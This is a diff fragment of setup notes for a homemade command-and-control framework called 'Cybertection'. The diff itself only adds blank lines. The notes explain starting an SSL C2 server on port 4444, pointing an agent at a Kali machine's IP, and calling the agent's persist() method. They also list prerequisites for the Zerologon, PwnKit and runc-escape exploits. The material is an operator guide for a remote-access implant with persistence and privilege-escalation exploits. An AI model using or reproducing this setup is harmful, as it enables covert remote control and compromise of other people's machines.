@@ -98,6 +98,7 @@ OpenSSL: sudo apt install openssl.
 Tkinter: sudo apt install python3-tk.
 Impacket: pip3 install impacket (for CVE-2020-1472).
 GCC: sudo apt install build-essential (for CVE-2021-4034, CVE-2019-5736).
+
 Steps
 Generate SSL Certs:
 Run server first: python3 cybertection_server.py.
@@ -140,6 +141,7 @@ bash
 Wrap
 Copy
 python3 cybertection_server.py
+
 GUI titled "Cybertection Server" opens.
 Terminal shows: [2025-02-23 ...] Cybertection C2 Server started on 0.0.0.0:4444 (SSL).
 Verify: netstat -tuln | grep 4444 (should show 0.0.0.0:4444 listening).
@@ -155,7 +157,10 @@ Wrap
 Copy
 [*] Attempting connection to 127.0.0.1:4444
 [+] Connected to Cybertection C2 at 127.0.0.1:4444 (SSL)
+
 GUI: "Connected Agents" list shows ('127.0.0.1', <random_port>).
+
+
 Scenario 2: Server on Kali, Agent Elsewhere (e.g., HP Envy Windows)
 Find Kali’s IP:
 ifconfig (or ip addr): Look for inet under your network interface (e.g., eth0 or wlan0), like 192.168.1.100.
@@ -168,7 +173,9 @@ if __name__ == "__main__":
     agent = CybertectionAgent(server_host="192.168.1.100")  # Replace with Kali’s IP
     threading.Thread(target=agent.run).start()
     agent.persist()
+
 Copy server.crt to the agent machine’s directory (optional, since CERT_NONE is used).
+
 Start Server on Kali:
 Same as above: python3 cybertection_server.py.
 
